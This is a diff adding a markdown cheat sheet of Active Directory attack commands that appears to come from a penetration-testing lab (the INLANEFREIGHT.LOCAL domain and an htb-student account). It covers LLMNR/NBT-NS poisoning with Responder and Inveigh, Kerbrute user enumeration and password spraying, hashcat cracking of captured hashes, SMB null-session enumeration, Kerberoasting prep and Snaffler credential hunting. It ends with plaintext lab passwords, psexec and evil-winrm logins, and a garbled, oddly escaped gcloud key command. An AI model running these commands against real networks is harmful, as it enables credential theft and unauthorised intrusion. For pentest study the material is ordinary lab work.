@@ -1,0 +1,91 @@
+## LLMNR/NBT-NS Poisoning
+### Identifying Hosts
+------------------From linux host-------------------
+#### Responder
+- Listening network traffic and capture
+`sudo responder -I ens224 -A`
+
+#### FPing Active Checks
+- Check alive hosts via ping
+`fping -asgq 172.16.5.0/23`
+
+
+
+## Internal AD Username Enumeration NULL section
+### Kerbrute 
+`kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users.txt`
+- Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested
+
+### windapsearch
+`windapsearch.py --dc-ip 172.16.5.5 -u "" -U | grep userPrincipalName: | cut -f2 -d" " > valid_users.txt`
+
+### ldapsearch
+`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`
+
+### Kerbrute - Password Spraying
+`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`
+
+### Hashcat
+`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
+
+-------------------From windows host----------------
+### Inveigh 
+- Listening network traffic and capture
+`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
+
+### SMB NULL Session to Pull User List
+`enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
+`crackmapexec smb 172.16.5.5 --users`
+
+### Password Spraying - from Windows
+- https://github.com/dafthack/DomainPasswordSpray
+```
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+## Enumerating the Password Policy
+- Check Lockout threshold, Minimum password length, Lockout duration
+### From Linux - Credentialed
+`crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`
+
+### From Linux - SMB NULL Sessions
+`enum4linux -P 172.16.5.5`
+
+## Credentialed Enumeration - from Windows
+### ActiveDirectory PowerShell Module
+- This is legal module made by MS. To use this module, we need to install manualy. Check module loaded:
+`Get-Module`
+
+#### Load ActiveDirectory Module
+`Import-Module ActiveDirectory`
+
+#### Get Domain Info
+`Get-ADDomain`
+
+#### Get-ADUser
+- List account has ServicePrincipalName property, it helpfull for Kerberoasting attack
+`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
+
+... 
+- More than command in this document [link](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
+
+## Snaffler
+- Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
+` .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`
+
+
+
+xfreerdp /v:10.129.1.139 /u:htb-student /p:Academy_student_AD!
+
+gcloud beta iam service-accounts keys get-public-key \
+    **c8920f8c67f01cd08d3ba82df36fbcbc30320fd8 \\**
+    \*\*--iam-account=kv-crm-staging@appspot.gserviceaccount.com \\\\\*\*
+    \\\*\\\*--output-file=public\\\\\\\_key.pem\\\*\\\*
+
+remmina -c rdp://htb-student@10.129.33.147
+rdesktop -u htb-student -p 'Academy_student_AD!' 10.129.20.231
+
+psexec.py inlanefreight.local/htb-student:'Academy_student_AD!'@10.129.21.13
+evil-winrm -i 10.129.21.13 -u htb-student -p Academy_student_AD!
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 10.129.21.13 -d inlanefreight.local -c all
